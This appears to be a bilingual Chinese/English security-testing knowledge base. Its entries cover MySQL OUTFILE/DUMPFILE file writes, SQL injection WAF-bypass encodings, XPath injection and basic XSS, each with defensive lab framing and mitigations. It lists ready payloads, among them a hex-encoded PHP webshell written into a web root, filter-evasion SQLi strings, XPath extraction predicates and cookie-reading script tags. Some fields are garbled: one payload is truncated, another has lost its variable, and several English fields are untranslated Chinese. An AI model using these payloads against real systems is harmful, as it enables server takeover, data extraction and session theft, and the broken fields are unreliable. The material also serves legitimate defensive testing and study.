exploitation.zh: 在隔离 MySQL 容器创建固定标记文件，确认 secure_file_priv 和账户权限后选择平台匹配的一行并替换路径。关联查询审计、mysqld 文件访问和标记哈希。禁止读取原示例系统文件。
exploitation.en: Create a fixed marker in an isolated MySQL container, inspect secure_file_priv and account privilege, choose a platform-matching line, and replace its path. Correlate query audit, mysqld file access, and marker hash. Never read the original system files.

mitigation.zh: 修复注入并从应用账户移除 FILE 权限，配置 secure_file_priv 为专用不可达目录或禁用，数据库容器使用最小只读文件系统，应用与数据库文件系统隔离，并监控 LOAD_FILE。
mitigation.en: Fix injection, remove FILE privilege from the application account, configure secure_file_priv to a dedicated inaccessible directory or disable it, use a minimal read-only database filesystem, isolate application and database storage, and monitor LOAD_FILE.

name.zh: MySQL OUTFILE 与 DUMPFILE 文件写入
name.en: MySQL OUTFILE and DUMPFILE File-Write Impact

description.zh: 使用文本与十六进制 SELECT INTO OUTFILE/DUMPFILE 样例验证注入查询是否能在数据库主机创建文件。
description.en: Uses text and hexadecimal SELECT INTO OUTFILE or DUMPFILE samples to test whether an injected query can create a file on the database host.

prerequisites.zh: 仅在一次性 MySQL 容器和不可执行空目录验证
prerequisites.en: Testing occurs only in a disposable MySQL container and an empty nonexecutable directory.

prerequisites.zh: 使用固定文本标记并可撤销 FILE 权限
prerequisites.en: A fixed text marker is used and FILE privilege can be revoked.

title.zh: OUTFILE/DUMPFILE 原始样例

execution.command:
' UNION SELECT '<?php system(["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'--

description.zh: 原始行用于说明文本/二进制写入差异。真实验证必须把内容替换为固定无害标记、路径改为非 Web 空目录，并确保文件不存在。
description.en: The original lines show text versus binary write behavior. Real validation must replace content with a fixed harmless marker, target a nonweb empty directory, and ensure the file does not exist.

analysis.zh: 分别证明 SQL 注入、FILE 权限、文件创建和 Web 执行。若只创建无害标记，结论是数据库主机文件写入，不应写成 WebShell 或 RCE。
analysis.en: Prove SQL injection, FILE privilege, file creation, and web execution separately. If only a harmless marker is created, classify database-host file write, not webshell or RCE.

opsecTips.zh: 禁止写 PHP 或十六进制脚本，目标必须位于非执行一次性目录。
opsecTips.en: Never write PHP or hexadecimal script content; the target must be a disposable nonexecutable directory.

opsecTips.zh: 写入前后核对目录清单并立即删除文件，避免残留或覆盖。
opsecTips.en: Inventory the directory before and after and delete the file immediately to prevent residue or overwrite.

title.zh: 准备空的非执行目录

description.zh: 在一次性容器确认目标不存在并准备固定标记与审计。
description.en: In a disposable container confirm the target does not exist and prepare a fixed marker and audit.

title.zh: 改写并执行一个写入样例
title.en: Rewrite and run one write sample

description.zh: 替换 PHP 内容和 Web 路径，只选择 OUTFILE 或 DUMPFILE 之一执行。
description.en: Replace PHP content and web path and execute either OUTFILE or DUMPFILE, not both.

attackChain.payload:
' UNION SELECT '<?php system(["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'--

title.zh: 确认数据库文件创建

description.zh: 匹配查询审计、mysqld 所有者、文件长度与标记哈希，排除预置文件。
description.en: Match query audit, mysqld ownership, file length, and marker hash, excluding preexisting files.

title.zh: 删除文件并撤销 FILE 权限
title.en: Delete the file and revoke FILE privilege

description.zh: 清理测试文件、修复查询和权限后重放，确认无法创建新文件。
description.en: Remove the test file, fix the query and privilege, and replay to confirm no new file can be created.

overview.zh: OUTFILE 可格式化输出，DUMPFILE 写单一二进制值；两者都是数据库文件写入原语。原样例指向 WebShell，但安全验证只确认数据库进程能否在隔离非执行目录创建固定标记文件。
overview.en: OUTFILE formats output and DUMPFILE writes one binary value; both are database file-write primitives. Although the samples target a webshell, safe validation only confirms marker-file creation in an isolated nonexecutable directory.

vulnerability.zh: 链条需要查询结构注入、FILE 权限、允许的 secure_file_priv 路径、mysqld 写权限和不存在的目标文件。Web 执行还要求数据库目录与 Web 根共享并配置脚本处理器，必须单独证明。
vulnerability.en: The chain requires query-structure injection, FILE privilege, an allowed secure_file_priv path, mysqld write permission, and a nonexistent target. Web execution additionally requires shared web storage and script mapping and must be proven separately.

exploitation.zh: 在一次性容器创建不可执行空目录，将内容改为随机固定标记，分别选择 OUTFILE 或 DUMPFILE 一行执行一次。关联查询日志、文件所有者、长度和哈希后删除。不得使用原 PHP 内容或 Web 路径。
exploitation.en: In a disposable container create an empty nonexecutable directory, replace content with a random fixed marker, and execute one OUTFILE or DUMPFILE line once. Correlate query logs, owner, length, and hash and then delete it. Never use the PHP content or web path.

mitigation.zh: 修复注入、从应用账户移除 FILE 权限、严格配置 secure_file_priv，并让数据库文件系统与 Web 根隔离且尽量只读。监控 INTO OUTFILE/DUMPFILE 并阻止数据库服务身份写入可执行目录。
mitigation.en: Fix injection, remove FILE privilege from the application account, strictly configure secure_file_priv, isolate database storage from web roots, and make it read-only where possible. Monitor INTO OUTFILE or DUMPFILE and prevent the database identity from writing executable directories.

name.zh: SQL 注入规范化绕过模式

description.zh: 使用版本注释、关键词拆分、百分号编码和大小写变体，验证 WAF、应用与数据库解码及词法分析是否一致。
description.en: Uses version comments, keyword splitting, percent encoding, and case variants to test decoding and lexical consistency across WAF, application, and database.

prerequisites.zh: 在 WAF、反向代理、应用框架和数据库边界记录原始字节、解码次数、字符集和最终 SQL 令牌。
prerequisites.en: Record raw bytes, decode count, character set, and final SQL tokens at the WAF, reverse proxy, application framework, and database boundaries.

prerequisites.zh: 确认 MySQL 版本注释及目标方言的注释规则，为规范形式、单一变换形式和结构相同的恒假谓词建立配对。
prerequisites.en: Confirm MySQL version-comment behavior and the target dialect's comment rules, pairing canonical, single-transformation, and structurally matched false predicates.

title.zh: 标准测试

execution.command:
/*!50000SELECT*/1--
/*!UNION*//*!SELECT*/1,2,3--
%55NION %53ELECT 1,2,3--
uni/**/on sel/**/ect 1,2,3--
unio%6e selec%74 1,2,3--
1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--
1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性是规范形式被同一策略阻止，而某个最小编码、大小写或注释拆分变体被放行，随后由应用/数据库规范化为可执行谓词并产生受控标记差异。WAF 未告警、HTTP 200、日志显示 SELECT、数据库报语法错、双重解码只改变显示或页面复述字符串均是假阳性。
analysis.en: Positive evidence is the canonical form being blocked by the same policy while one minimal encoding, case, or comment-splitting variant passes, is normalized into an executable predicate by the application or database, and produces a controlled marker differential. No WAF alert, HTTP 200, SELECT appearing in logs, a database syntax error, double decoding that changes only display, or page reflection is a false positive.

opsecTips.zh: 确认一个最小变换及其发生分歧的层后停止，不继续组合大小写、注释和多重百分号编码。
opsecTips.en: Stop after confirming one minimal transformation and the layer where behavior diverges; do not combine case, comments, and repeated percent encoding.

opsecTips.zh: 移除原始流量调试记录，清空代理和应用解码缓存，删除临时 WAF 例外，并恢复统一规范化规则。
opsecTips.en: Remove raw-traffic debug records, clear proxy and application decoding caches, delete temporary WAF exceptions, and restore consistent normalization rules.

title.zh: SQL注入WAF绕过模式集合

wafBypass.command:
/*!50000SELECT*/1--
/*!UNION*//*!SELECT*/1,2,3--
%55NION %53ELECT 1,2,3--
uni/**/on sel/**/ect 1,2,3--
unio%6e selec%74 1,2,3--
1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--
1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'

description.zh: SQL注入WAF绕过模式集合，共7条
description.en: bypass payloads

title.zh: 确认SQL/WAF 规范化差异前置条件

description.zh: MySQL 版本注释可执行内容，内联注释可拆词，百分号编码可在不同层解码；必须捕获原始字节和最终 SQL。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: MySQL version comments may execute content, inline comments can split tokens, and percent encoding can decode at different layers; capture raw bytes and final SQL. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控SQL/WAF 规范化差异探针
title.en: Run a controlled SQL/WAF Normalization Differences probe

description.zh: 先以普通 UNION 或真假谓词确认注入，再一次只改变注释、编码或大小写，保持 SQL 语义和其他字节不变。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Confirm injection with a plain UNION or predicate, then change only comment, encoding, or case while preserving SQL semantics and all other bytes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
/*!50000SELECT*/1--
/*!UNION*//*!SELECT*/1,2,3--
%55NION %53ELECT 1,2,3--
uni/**/on sel/**/ect 1,2,3--
unio%6e selec%74 1,2,3--
1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--
1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'

title.zh: 核对SQL/WAF 规范化差异成功证据

description.zh: 只有普通形式被拦截、变体到达后端且最终表达式执行，才说明规范化绕过；单纯状态码变化不成立。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: A normalization bypass requires the plain form to be blocked, the variant to reach the backend, and the final expression to execute; status-code changes alone are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归SQL/WAF 规范化差异
title.en: Remediate and regress SQL/WAF Normalization Differences

description.zh: 在可信边界只做一次严格规范化，拒绝双重编码和非法 UTF-8，再类型校验与参数绑定；WAF 仅作纵深。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Canonicalize once at the trust boundary, reject double encoding and invalid UTF-8, then validate types and bind parameters; use the WAF only as defense in depth. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: SQL 注入规范化绕过模式聚焦MySQL 版本注释可执行内容，内联注释可拆词，百分号编码可在不同层解码；必须捕获原始字节和最终 SQL。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: SQL injection Normalization-Bypass Patterns focuses on this boundary: MySQL version comments may execute content, inline comments can split tokens, and percent encoding can decode at different layers; capture raw bytes and final SQL. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: WAF 一次解码或简单正则后判断，而应用再次解码或数据库赋予注释特殊语义，攻击文本可能在检测后恢复为有效 SQL。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: When a WAF inspects after one decode or simple regex while the application decodes again or the database gives comments special meaning, text can become valid SQL after inspection. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 先以普通 UNION 或真假谓词确认注入，再一次只改变注释、编码或大小写，保持 SQL 语义和其他字节不变。 只有普通形式被拦截、变体到达后端且最终表达式执行，才说明规范化绕过；单纯状态码变化不成立。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Confirm injection with a plain UNION or predicate, then change only comment, encoding, or case while preserving SQL semantics and all other bytes. A normalization bypass requires the plain form to be blocked, the variant to reach the backend, and the final expression to execute; status-code changes alone are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 在可信边界只做一次严格规范化，拒绝双重编码和非法 UTF-8，再类型校验与参数绑定；WAF 仅作纵深。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Canonicalize once at the trust boundary, reject double encoding and invalid UTF-8, then validate types and bind parameters; use the WAF only as defense in depth. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: XPath 表达式注入

description.zh: 通过布尔谓词、节点计数、名称判断和 substring 条件，验证输入是否被拼接到 XPath 查询表达式。
description.en: Uses Boolean predicates, node counts, name tests, and substring conditions to verify whether input is concatenated into an XPath query expression.

prerequisites.zh: 使用只含合成用户和随机 canary 节点的独立 XML 文档，并确认 XPath 版本、命名空间及输入拼接位置。
prerequisites.en: Use an isolated XML document containing only synthetic users and a random canary node, and confirm the XPath version, namespaces, and input concatenation position.

prerequisites.zh: 启用编译后 XPath 或查询结果审计，为名称、节点计数和 substring 条件分别准备结构一致的真/假对照。
prerequisites.en: Enable compiled-XPath or query-result auditing, and prepare structurally matched true and false controls for name, node-count, and substring conditions.

title.zh: XPath注入

execution.command:
' or 1=1 or ''='
' or name()='admin' or '
count(/child::node())
' and string-length(/root/child::*)>0 and '1'='1
' or substring(//user[position()=1]/child::node()[position()=1],1,1)='a

description.zh: XPath注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: XPath Injection contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求恒真 XPath 条件稳定返回预置 canary 节点或计数，而恒假条件不返回，且编译查询显示输入越过字符串边界。XML 解析错误、命名空间不匹配、正常搜索命中、页面回显表达式、或猜中常见节点名都不是 XPath 注入证据。
analysis.en: Positive evidence requires the true XPath condition to reproducibly return the preset canary node or count while the false condition does not, with the compiled query showing input crossing the string boundary. XML parse errors, namespace mismatch, legitimate search matches, expression reflection, or guessing a common node name are not XPath-injection evidence.

opsecTips.zh: 首次通过真/假条件定位到 canary 节点后停止，不枚举生产 XML 的用户、密码或完整树结构。
opsecTips.en: Stop after the first true/false pair locates the canary node; do not enumerate users, passwords, or the full tree of production XML.

opsecTips.zh: 删除测试 XML 和 canary，清除编译查询与响应缓存，并恢复命名空间配置和参数化 XPath 构造。
opsecTips.en: Delete the test XML and canary, clear compiled-query and response caches, and restore namespace configuration and parameterized XPath construction.

title.zh: 确认XPath 查询注入前置条件

description.zh: XPath 注入针对 XML 查询而非关系型 SQL；应记录 XPath 版本与命名空间，并使用成对真假节点条件。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: XPath injection targets XML queries rather than relational SQL; record XPath version and namespaces and use paired true and false node conditions. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控XPath 查询注入探针
title.en: Run a controlled XPath Query Injection probe

description.zh: 用受控账户建立匹配与不匹配基线，再以相同闭合方式发送真假谓词；盲测只对测试节点做 count 或单字符判断。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Use a controlled account for match and no-match baselines, then send true and false predicates with identical closure; blind tests should query only controlled nodes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
' or 1=1 or ''='
' or name()='admin' or '
count(/child::node())
' and string-length(/root/child::*)>0 and '1'='1
' or substring(//user[position()=1]/child::node()[position()=1],1,1)='a

title.zh: 核对XPath 查询注入成功证据

description.zh: 最终 XPath、返回节点集合和身份必须一致证明查询被改变；统一登录错误、表达式语法错或空节点都不是充分证据。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Final XPath, returned node set, and identity must jointly prove query alteration; generic login errors, expression errors, or empty nodes are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归XPath 查询注入
title.en: Remediate and regress XPath Query Injection

description.zh: 使用固定 XPath 与变量解析器，不拼接路径或谓词；若无变量 API，使用经过验证的 XPath 字面量编码器并限制 XML 权限。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use fixed XPath with variable resolvers rather than concatenating paths or predicates; if variables are unavailable, use a vetted XPath literal encoder and restrict XML access. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: XPath 表达式注入聚焦XPath 注入针对 XML 查询而非关系型 SQL；应记录 XPath 版本与命名空间，并使用成对真假节点条件。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: XPath Expression Injection focuses on this boundary: XPath injection targets XML queries rather than relational SQL; record XPath version and namespaces and use paired true and false node conditions. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入被插入 XPath 字面量或谓词后，可关闭原字符串并追加 or、节点选择或函数；许多 API 缺少统一参数绑定。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Input inserted into an XPath literal or predicate can close the string and append or, node selection, or functions; many APIs lack universal parameter binding. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 用受控账户建立匹配与不匹配基线，再以相同闭合方式发送真假谓词；盲测只对测试节点做 count 或单字符判断。 最终 XPath、返回节点集合和身份必须一致证明查询被改变；统一登录错误、表达式语法错或空节点都不是充分证据。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Use a controlled account for match and no-match baselines, then send true and false predicates with identical closure; blind tests should query only controlled nodes. Final XPath, returned node set, and identity must jointly prove query alteration; generic login errors, expression errors, or empty nodes are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用固定 XPath 与变量解析器，不拼接路径或谓词；若无变量 API，使用经过验证的 XPath 字面量编码器并限制 XML 权限。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use fixed XPath with variable resolvers rather than concatenating paths or predicates; if variables are unavailable, use a vetted XPath literal encoder and restrict XML access. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: 基础脚本元素注入

description.zh: 验证不可信输入进入 HTML 元素上下文后，是否能够形成并执行 script 元素；保留多种无害可观察函数作为解析差异样例。
description.en: Validates whether untrusted input can form and execute a script element in an HTML element context, using harmless observable functions to compare parser behavior.

prerequisites.zh: 可控输入确实进入浏览器解析的 HTML 元素上下文，且输出位置不在纯文本、模板或已禁用脚本的容器中。
prerequisites.en: Controllable input reaches an HTML element context parsed by the browser rather than a text-only, template, or script-disabled container.

prerequisites.zh: 隔离页面使用一次性固定 marker 函数，并可保存响应源码、解析后 DOM、CSP 控制台和对应请求 ID。
prerequisites.en: An isolated page uses a one-time fixed marker function and preserves response source, parsed DOM, CSP console output, and the corresponding request identifier.

title.zh: 基础注入
title.en: Validation step 1 for Basic Script Element Injection

description.zh: 基础注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Basic Script Element Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是响应中的输入被浏览器构造成 script 元素，并在应用页面来源下执行一次性 marker；源码、DOM 节点、调用栈和请求 ID 必须相互对应。 假阳性边界：仅看到字符串回显、静态扫描器告警、script 文本位于 textarea/template 中、CSP 阻止执行或浏览器扩展触发弹窗都不是成功 XSS。
analysis.en: Positive evidence requires the reflected input to become a script element and execute a one-time marker under the application origin, with source, DOM node, call stack, and request identifier correlated. False-positive boundary: String reflection, a scanner alert, script text inside textarea or template, CSP-blocked execution, or a browser-extension popup does not prove XSS.

opsecTips.zh: 基础脚本元素注入只运行固定 marker；出现 cookie/存储读取、网络外发、页面导航、持久写入或非测试用户会话时立即停止。
opsecTips.en: Basic Script Element Injection uses only a fixed marker; stop on cookie or storage access, egress, navigation, persistent writes, or any non-test user session.

opsecTips.zh: 删除注入记录与测试页面，清理模板/CDN 缓存和浏览器站点数据，移除 marker 函数并确认页面重载后不再执行。
opsecTips.en: Delete injected records and test pages, clear template and CDN caches plus browser site data, remove the marker function, and confirm no execution after reload.

title.zh: 定位“基础脚本元素注入”的输出上下文
title.en: Scope the Basic Script Element Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“应用把原始值拼接进 HTML 响应或危险 DOM 写入点，且没有执行与位置匹配的输出编码”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that the application concatenates the raw value into an HTML response or dangerous DOM write sink without context-appropriate output encoding, and record browser, response-header, and relevant component versions.

title.zh: 建立“HTML 元素上下文”解析基线
title.en: Establish the HTML Element Context baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only a Java Script execution record tied to the unique test marker, not merely angle-bracket text appearing in the response as valid evidence.

title.zh: 逐条重放“基础脚本元素注入”样例
title.en: Run a single-variable Basic Script Element Injection check

description.zh: 先以普通文本建立编码基线，再在同一参数中提交原集合，逐条确认标签是否进入 DOM、脚本是否被 CSP 阻止以及事件是否只触发一次；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: establish an encoding baseline with plain text, then submit the original set through the same parameter and check DOM creation, CSP enforcement, and single execution per marker; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(document.location)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(atob('WFNT'))</script>
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>console.log(1)</script>
<script>document.write('XSS')</script>
<script>eval('alert(1)')</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<script>new Function('alert(1)')()</script>

title.zh: 修复并回归“基础脚本元素注入”
title.en: Retest the Basic Script Element Injection remediation boundary

description.zh: 按 HTML 文本上下文编码输出，禁止把不可信值交给 innerHTML、document.write 或模板原样输出，并以严格 CSP 作为纵深防御；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while a Java Script execution record tied to the unique test marker, not merely angle-bracket text appearing in the response no longer appears.

overview.zh: 基础脚本元素注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：输入是否越过文本节点边界并被 HTML 解析器创建为可执行 script 元素。测试成立的前提为：应用把原始值拼接进 HTML 响应或危险 DOM 写入点，且没有执行与位置匹配的输出编码。证据要求为：唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Basic Script Element Injection checks whether input crosses a text-node boundary and is created as an executable script element by the HTML parser. It applies when the application concatenates the raw value into an HTML response or dangerous DOM write sink without context-appropriate output encoding. A conclusion requires a Java Script execution record tied to the unique test marker, not merely angle-bracket text appearing in the response; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：应用把原始值拼接进 HTML 响应或危险 DOM 写入点，且没有执行与位置匹配的输出编码。审查时必须确认“输入是否越过文本节点边界并被 HTML 解析器创建为可执行 script 元素”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the application concatenates the raw value into an HTML response or dangerous DOM write sink without context-appropriate output encoding, allowing whether input crosses a text-node boundary and is created as an executable script element by the HTML parser. Review the input source, final parsing context, browser or policy version, and a Java Script execution record tied to the unique test marker, not merely angle-bracket text appearing in the response; otherwise record only an unconfirmed control differential.

exploitation.zh: 先以普通文本建立编码基线，再在同一参数中提交原集合，逐条确认标签是否进入 DOM、脚本是否被 CSP 阻止以及事件是否只触发一次。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, establish an encoding baseline with plain text, then submit the original set through the same parameter and check DOM creation, CSP enforcement, and single execution per marker. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 按 HTML 文本上下文编码输出，禁止把不可信值交给 innerHTML、document.write 或模板原样输出，并以严格 CSP 作为纵深防御。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should encode for the HTML text context, keep untrusted values out of inner HTML, document.write, and raw template output, and use a strict CSP as defense in depth. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: HTML 事件处理器注入

description.zh: 覆盖 img、svg、body、input 等元素的事件属性，验证输入能否逃逸属性或元素边界并注册可执行事件处理器。
description.en: Covers event attributes on img, svg, body, input, and related elements to test whether input can escape an attribute or element boundary and register executable handlers.

prerequisites.zh: 输入能够闭合或创建 HTML 属性/元素，目标浏览器支持相应事件，并可确定 onerror、onload、onfocus 等事件的真实触发条件。
prerequisites.en: Input can close or create an HTML attribute or element, the target browser supports the event, and the real trigger condition for onerror, onload, or focus is known.

prerequisites.zh: 测试资源可确定地产生成功或失败状态，事件处理器仅调用一次性 marker，并启用 DOM 与事件监听审计。
prerequisites.en: Test resources deterministically succeed or fail, handlers call only a one-time marker, and DOM plus event-listener auditing is enabled.

title.zh: 标签事件处理器
title.en: Validation step 1 for HTML Event Handler Injection

execution.command: ">

description.zh: 标签事件处理器包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this HTML Event Handler Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是浏览器将属性注册为事件处理器，在预期资源或焦点事件发生时由该处理器执行 marker，并能从事件目标与调用栈定位到注入节点。 假阳性边界：元素或 on* 字符串出现在 DOM 中但事件不受支持、未触发、被 sanitizer 删除，或 marker 来自测试人员手工点击控制台，都属于假阳性。
analysis.en: Positive evidence requires the browser to register the attribute as an event handler and execute the marker on the expected resource or focus event, with event target and call stack tied to the injected node. False-positive boundary: An element or on* string in the DOM is a false positive when the event is unsupported, never fires, is removed by a sanitizer, or the marker came from manual console interaction.

opsecTips.zh: HTML 事件处理器注入每次只触发一个无害事件；出现表单提交、窗口打开、重复事件循环、外部资源请求或用户交互劫持时停止。
opsecTips.en: HTML Event Handler Injection triggers one harmless event per run; stop on form submission, window opening, event loops, external resource requests, or hijacked user interaction.

opsecTips.zh: 移除测试元素和事件监听器，撤销临时资源失败规则，清空页面缓存与会话 DOM，并重载确认不再有残留处理器。
opsecTips.en: Remove test elements and event listeners, revert temporary resource-failure rules, clear page caches and session DOM, and reload to confirm no handler remains.

title.zh: 定位“HTML 事件处理器注入”的输出上下文
title.en: Scope the HTML Event Handler Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that a template lets user data close an existing attribute or create a new element without attribute encoding, an element allowlist, or HTML sanitization, and record browser, response-header, and relevant component versions.

title.zh: 建立“事件属性上下文”解析基线
title.en: Establish the Event Attribute Context baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型”。
description.en: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型”。

title.zh: 逐条重放“HTML 事件处理器注入”样例
title.en: Run a single-variable HTML Event Handler Injection check

description.zh: 分别选择自动触发与需要焦点、悬停或展开的样例，在相同页面状态下逐一重放，记录哪些元素与事件仍被消毒器允许；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: replay automatic and interaction-dependent samples separately under the same page state, recording which elements and events survive sanitization; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload: ">

title.zh: 修复并回归“HTML 事件处理器注入”
title.en: Retest the HTML Event Handler Injection remediation boundary

description.zh: 使用维护中的 HTML 消毒器移除事件属性和危险元素，对必须保留的属性执行上下文编码，并避免通过字符串拼接创建 DOM；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: 使用维护中的 HTML 消毒器移除事件属性和危险元素，对必须保留的属性执行上下文编码，并避免通过字符串拼接创建 DOM；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。

overview.zh: HTML 事件处理器注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发。测试成立的前提为：模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒。证据要求为：指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: HTML 事件处理器注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发。测试成立的前提为：模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒。证据要求为：指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型。响应中出现输入文本或标签并不等同于脚本已经执行。

vulnerability.zh: 该问题的输入与输出前提为：模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒。审查时必须确认“浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型”这一证据要求，只能说明输入进入页面，不能确认 XSS。
